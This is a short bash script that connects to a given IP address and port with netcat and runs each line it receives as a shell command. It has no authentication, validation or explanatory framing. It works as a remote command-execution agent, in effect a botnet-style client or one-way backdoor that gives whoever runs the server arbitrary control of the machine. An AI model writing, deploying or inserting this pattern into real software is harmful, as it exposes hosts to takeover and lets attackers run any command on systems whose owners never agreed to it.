#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <IP_address> <port>"
    exit 1
fi

IP_ADDRESS=$1
PORT=$2

# Connect to the server
nc $IP_ADDRESS $PORT | while read -r message; do
    # Execute broadcasted message
    $message
done
